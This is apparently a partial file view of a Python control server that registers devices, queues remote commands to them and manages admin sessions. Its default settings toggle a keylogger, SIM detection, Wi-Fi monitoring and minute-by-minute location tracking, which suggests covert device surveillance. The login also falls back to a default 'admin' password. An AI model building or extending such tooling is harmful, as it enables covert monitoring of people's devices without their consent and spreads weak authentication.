+   329→   374→        "sync_interval": 300,
+   330→   375→        "location_interval": 60,
+   331→   376→        "auto_location": True,
+   332→   377→        "auto_sync": True,
+   333→   378→        "language": "ar",
+   334→   379→        "notifications": True,
+   335→   380→        "keylogger": False,
+   336→   381→        "sim_detect": False,
+   337→   382→        "wifi_monitor": False,
+   338→   383→        "geofences": [],
+   339→   384→    })
+   340→   385→
+   341→   386→
+   342→   387→def save_settings_data(settings):
+   343→   388→    save_json(SETTINGS_FILE, settings)
+   344→   389→
+   345→   390→
+   346→   391→def ts():
+   347→   392→    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+   348→   393→
+   349→   394→
+   350→   395→def get_uptime():
+   351→   396→    return int(time.time() - START_TIME)
+   352→   397→
+   353→   398→
+   354→   399→def format_uptime(seconds):
+   355→   400→    d = seconds // 86400
+   356→   401→    h = (seconds % 86400) // 3600
+   357→   402→    m = (seconds % 3600) // 60
+   358→   403→    s = seconds % 60
+   359→   404→    parts = []
+   360→   405→    if d: parts.append(f"{d}d")
+   361→   406→    if h: parts.append(f"{h}h")
+   362→   407→    if m: parts.append(f"{m}m")
+   363→   408→    parts.append(f"{s}s")
+   364→   409→    return " ".join(parts)
+   365→   410→
+   366→   411→# ============================================================================
+   367→   412→# DEVICE HELPERS
+   368→   413→# ============================================================================
+   369→   414→
+   370→   415→def get_devices():
+   371→   416→    return load_json(DEVICES_FILE, [])
+   372→   417→
+   373→   418→
+   374→   419→def save_devices(devices):
+   375→   420→    save_json(DEVICES_FILE, devices)
+   376→   421→
+   377→   422→
+   378→   423→def find_device(device_id):
+   379→   424→    for d in get_devices():
+   380→   425→        if d.get("id") == device_id:
+   381→   426→            return d
+   382→   427→    return None
+   383→   428→
+   384→   429→
+   385→   430→def update_device(device_id, updates):
+   386→   431→    devices = get_devices()
+   387→   432→    for i, d in enumerate(devices):
+   388→   433→        if d.get("id") == device_id:
+   389→   434→            d.update(updates)
+   390→   435→            d["last_seen"] = ts()
+   391→   436→            devices[i] = d
+   392→   437→            save_devices(devices)
+   393→   438→            return d
+   394→   439→    return None
+   395→   440→
+   396→   441→
+   397→   442→def add_device(device_data):
+   398→   443→    devices = get_devices()
+   399→   444→    for i, d in enumerate(devices):
+   400→   445→        if d.get("id") == device_data.get("id"):
+   401→   446→            device_data["last_seen"] = ts()
+   402→   447→            devices[i] = device_data
+   403→   448→            save_devices(devices)
+   404→   449→            return device_data
+   405→   450→    device_data["last_seen"] = ts()
+   406→   451→    device_data["created_at"] = ts()
+   407→   452→    devices.append(device_data)
+   408→   453→    save_devices(devices)
+   409→   454→    append_event("Device registered", {"id": device_data["id"], "name": device_data.get("name", "")})
+   410→   455→    return device_data
+   411→   456→
+   412→   457→
+   413→   458→def remove_device(device_id):
+   414→   459→    devices = get_devices()
+   415→   460→    new_devices = [d for d in devices if d.get("id") != device_id]
+   416→   461→    if len(new_devices) == len(devices):
+   417→   462→        return False
+   418→   463→    save_devices(new_devices)
+   419→   464→    append_event("Device removed", {"id": device_id})
+   420→   465→    return True
+   421→   466→
+   422→   467→
+   423→   468→def get_first_device():
+   424→   469→    devices = get_devices()
+   425→   470→    return devices[0] if devices else None
+   426→   471→
+   427→   472→# ============================================================================
+   428→   473→# COMMAND QUEUE HELPERS
+   429→   474→# ============================================================================
+   430→   475→
+   431→   476→def queue_command(device_id, command, params=None):
+   432→   477→    commands = load_json(COMMANDS_FILE, [])
+   433→   478→    cmd = {
+   434→   479→        "id": str(uuid.uuid4())[:8],
+   435→   480→        "device_id": device_id,
+   436→   481→        "command": command,
+   437→   482→        "params": params or {},
+   438→   483→        "status": "pending",
+   439→   484→        "created_at": ts(),
+   440→   485→        "sent_at": None,
+   441→   486→        "result": None,
+   442→   487→    }
+   443→   488→    commands.append(cmd)
+   444→   489→    if len(commands) > 1000:
+   445→   490→        commands = commands[-1000:]
+   446→   491→    save_json(COMMANDS_FILE, commands)
+   447→   492→    append_event("Command queued", {"device_id": device_id, "command": command, "cmd_id": cmd["id"]})
+   448→   493→    firebase_push_command(cmd)
+   449→   494→    return cmd
+   450→   495→
+   451→   496→
+   452→   497→def get_pending_commands(device_id):
+   453→   498→    commands = load_json(COMMANDS_FILE, [])
+   454→   499→    return [c for c in commands if c.get("device_id") == device_id and c.get("status") == "pending"]
+   455→   500→
+   456→   501→
+   457→   502→def update_command_status(cmd_id, status, result=None):
+   458→   503→    commands = load_json(COMMANDS_FILE, [])
+   459→   504→    for i, c in enumerate(commands):
+   460→   505→        if c.get("id") == cmd_id:
+   461→   506→            commands[i]["status"] = status
+   462→   507→            commands[i]["result"] = result
+   463→   508→            commands[i]["completed_at"] = ts()
+   464→   509→            save_json(COMMANDS_FILE, commands)
+   465→   510→            return commands[i]
+   466→   511→    return None
+   467→   512→
+   468→   513→# ============================================================================
+   469→   514→# SESSION HELPERS
+   470→   515→# ============================================================================
+   471→   516→
+   472→   517→def create_session(username, password, ip="", ua=""):
+   473→   518→    settings = load_settings()
+   474→   519→    if password != settings.get("admin_password", "admin"):
+   475→   520→        return None
+   476→   521→    sessions = load_json(SESSIONS_FILE, [])
+   477→   522→    token = secrets.token_urlsafe(32)
+   478→   523→    session = {
+   479→   524→        "token": token,
+   480→   525→        "username": username,
+   481→   526→        "created_at": datetime.now(timezone.utc).isoformat(),
+   482→   527→        "expires_at": (datetime.now(timezone.utc) + timedelta(hours=24)).isoformat(),
+   483→   528→        "ip": ip,
+   484→   529→        "user_agent": ua,
+   485→   530→    }
+   486→   531→    sessions.append(session)
+   487→   532→    if len(sessions) > 100:
+   488→   533→        sessions = sessions[-100:]
+   489→   534→    save_json(SESSIONS_FILE, sessions)
+   490→   535→    append_event("Web login", {"username": username, "ip": ip})
+   491→   536→    return session
+   492→   537→
+   493→   538→
+   494→   539→def validate_session(token):
+   495→   540→    sessions = load_json(SESSIONS_FILE, [])
+   496→   541→    now = datetime.now(timezone.utc)
+   497→   542→    for s in sessions:
+   498→   543→        if s.get("token") == token:
+   499→   544→            try:
+   500→   545→                expires = datetime.fromisoformat(s.get("expires_at", "")).replace(tzinfo=timezone.utc)
+   501→
+   502→[showing lines 46-545 of 4290; use offset=546 with limit to continue reading]
